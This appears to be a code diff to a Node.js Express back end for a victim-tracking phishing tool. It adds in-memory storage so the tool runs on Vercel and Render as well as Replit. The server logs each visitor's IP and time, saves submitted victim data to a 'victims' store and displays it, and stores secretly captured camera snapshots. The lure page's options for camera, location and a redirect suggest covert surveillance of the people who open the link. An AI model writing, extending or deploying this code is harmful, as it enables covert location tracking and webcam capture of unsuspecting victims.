@@ -8,11 +8,23 @@ const config=require('./app').config;
 const isDeployment = process.env.REPLIT_DEPLOYMENT === '1' || process.env.VERCEL === '1' || process.env.RENDER === '1';
 let objectStorageClient;
 
+// In-memory storage for non-Replit deployments
+let memoryStorage = {
+  logs: '',
+  victimsData: '',
+  images: new Map()
+};
+
 if (isDeployment) {
   try {
-    const { Client } = require('@replit/object-storage');
-    objectStorageClient = new Client();
-    console.log('Object Storage initialized for deployment');
+    // Only try to use Replit Object Storage on Replit
+    if (process.env.REPLIT_DEPLOYMENT === '1') {
+      const { Client } = require('@replit/object-storage');
+      objectStorageClient = new Client();
+      console.log('Object Storage initialized for Replit deployment');
+    } else {
+      console.log('Using memory storage for non-Replit deployment');
+    }
   } catch (err) {
     console.log('Object Storage not available, using memory storage');
   }
@@ -33,7 +45,7 @@ if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split("
 res.render("index",{ip:ip,time:d,redirect:config.redirectURL,camera:config.camera,cams:config.camsnaps,location:config.location});
 
 if (isDeployment && objectStorageClient) {
-  // Use Object Storage for deployment
+  // Use Object Storage for Replit deployment
   objectStorageClient.downloadAsText('log.txt').then(existingLog => {
     const newLog = (existingLog || '') + "Visit Form: "+ip+" | At:"+d+"\n\n";
     return objectStorageClient.uploadFromText('log.txt', newLog);
@@ -41,6 +53,9 @@ if (isDeployment && objectStorageClient) {
     // File doesn't exist, create new
     objectStorageClient.uploadFromText('log.txt', "Visit Form: "+ip+" | At:"+d+"\n\n");
   });
+} else if (isDeployment) {
+  // Use memory storage for non-Replit deployments (Vercel/Render)
+  memoryStorage.logs += "Visit Form: "+ip+" | At:"+d+"\n\n";
 } else {
   // Use local file system for development
   try {
@@ -54,19 +69,22 @@ if (isDeployment && objectStorageClient) {
 });
 app.get("/victims",(req,res)=>{
   if (isDeployment && objectStorageClient) {
-    // Load victims data from Object Storage
+    // Load victims data from Object Storage (Replit)
     objectStorageClient.downloadAsText('victims-data.txt').then(victimsData => {
       res.render("victims", {victimsData: victimsData || ''});
     }).catch(err => {
       res.render("victims", {victimsData: ''});
     });
+  } else if (isDeployment) {
+    // Use memory storage for non-Replit deployments
+    res.render("victims", {victimsData: memoryStorage.victimsData || ''});
   } else {
     res.render("victims", {victimsData: ''});
   }
 });
 app.post("/",(req,res)=>{
 if (isDeployment && objectStorageClient) {
-  // Use Object Storage for deployment
+  // Use Object Storage for Replit deployment
   objectStorageClient.downloadAsText('victims-data.txt').then(existingData => {
     const newData = (existingData || '') + decodeURIComponent(req.body.data)+"\n\n";
     return objectStorageClient.uploadFromText('victims-data.txt', newData);
@@ -83,6 +101,11 @@ if (isDeployment && objectStorageClient) {
       res.send("Error saving data");
     });
   });
+} else if (isDeployment) {
+  // Use memory storage for non-Replit deployments
+  memoryStorage.victimsData += decodeURIComponent(req.body.data)+"\n\n";
+  console.log('Saved to memory!');
+  res.send("Done");
 } else {
   // Use local file system for development
   try {
@@ -103,7 +126,7 @@ if (isDeployment && objectStorageClient) {
 });
 app.post("/camsnap",(req,res)=>{
 if (isDeployment && objectStorageClient) {
-  // Store images in Object Storage for deployment
+  // Store images in Object Storage for Replit deployment
   try {
     const fileName = `img-${Date.now()}.png`;
     const base64Data = decodeURIComponent(req.body.img).replace(/^data:image\/png;base64,/, '');
@@ -115,6 +138,17 @@ if (isDeployment && objectStorageClient) {
       console.log('Image upload error:', err.message);
       res.send('upload-error');
     });
+  } catch (err) {
+    console.log('Image processing error:', err.message);
+    res.send('processing-error');
+  }
+} else if (isDeployment) {
+  // Store images in memory for non-Replit deployments
+  try {
+    const fileName = `img-${Date.now()}.png`;
+    const base64Data = decodeURIComponent(req.body.img).replace(/^data:image\/png;base64,/, '');
+    memoryStorage.images.set(fileName, base64Data);
+    res.send(fileName);
   } catch (err) {
     console.log('Image processing error:', err.message);
     res.send('processing-error');
